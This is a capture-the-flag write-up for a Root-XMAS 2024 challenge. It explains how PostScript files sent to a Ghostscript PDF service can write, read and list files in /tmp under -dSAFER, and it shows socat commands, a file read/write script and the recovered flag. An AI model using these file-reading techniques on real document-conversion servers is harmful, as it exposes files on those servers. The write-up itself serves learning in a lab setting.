---
title: Root-XMAS 2024 Day 17 - Ghost in the shell
feed: hide
permalink: /RootXMAS_2024_17
date: 17-12-2024
summary: complex stand-alone
---
### summary

Lots of vulnerabilities are available on Ghostscript, but sometimes features are enough: you can list files in a folder with a Ghostscript file!
### recon

We have our own instance of a server which we can send a Postscript/Ghostscript file, and he will return a PDF file (base64 encoded). We need to get the content of a file which we don't have the name in `/tmp`

sending the example file given in the challenge readme, we are returned a PDF, but also the version of Ghostscript!

```bash
cat hello.gs | socat - TCP:dyn-01.xmas.root-me.org:31489 
GPL Ghostscript 9.53.3 (2020-10-01)
Copyright (C) 2020 Artifex Software,
```

Damn, a 4 years old binary, let's check... wow, there are [lots of](https://codeanlabs.com/blog/research/cve-2024-29510-ghostscript-format-string-exploitation/) [very different](https://www.vicarius.io/vsociety/posts/cve-2023-36664-command-injection-with-ghostscript-poc-exploit) [RCE vunerabilities](https://offsec.almond.consulting/ghostscript-cve-2023-28879.html)!

And you know what? after testing them all, recompiling the correct version of Ghostscript on my machine to craft a special payload... none of them worked. And the solution was much simpler.

Of course, I tried reading and writing files with a simple script like this, found on this ["File io" question on Stackoverflow](https://stackoverflow.com/a/25702652)

```ghostscript
/outfile1 (/tmp/output1.txt) (w) file def
outfile1 (hello world) writestring
outfile1 closefile 

/inputfile (/tmp/output1.txt) (r) file def
inputfile 100 string readstring
show inputfile
pop
inputfile closefile

showpage
```

It happens that this script does not really work, as it doesn't produce a valid PDF, but still we have the content of our file in the error output:

```bash
cat test_write_read.ps | socat - TCP:dyn-01.xmas.root-me.org:31489
	...
	Error: /typecheck in --show--
	Operand stack:
	   (hello world\n)   false
   ...
```

we also know that the `-dSAFER` option of Ghostscript is used, as we have an `/invalidfileaccess` error if we try to access any file outside of `/tmp`. Thankfully the flag is in this directory! 

Still, we have no way to list files in a directory... I searched online and found few documentation, and ChatGPT ensured me there was no way to do it... dirty liar!
### solution

I skimmed a bit too much one specific article of the [redteam-pentesting.de blog : "Better dSAFER than Sorry"](https://blog.redteam-pentesting.de/2023/ghostscript-overview/)

At first they talk about the latest CVEs I tried, but after they provide examples of script that allow... to list files in a directory!

Let's just go on their  [RedTeamPentesting/postscript_blog_examples repo](https://github.com/RedTeamPentesting/postscript_blog_examples) to download them.

```bash
cat list_files.ps | socat - TCP:dyn-01.xmas.root-me.org:31489 |\
tail -n 1 | base64 -d > res.pdf && evince res.pdf

	/tmp/gs_JHGIAL
	...
	/tmp/flag-9fb215456edead...9d.txt
```

We just change the end of the `print_file.ps` to add the path of our flag file, and we're done!

```bash
cat print_file.ps | socat - TCP:dyn-01.xmas.root-me.org:31489 |\
tail -n 1 | base64 -d > res.pdf && evince res.pdf

	RM{Gh0Scr1pt_c4n_d0_THIS??}
```




| Previous day | [[Day 16 - Coil under the tree]] |
| ------------ | -------------------------------- |
| Next day     | [[Day 18 - Santa's sweet words]] |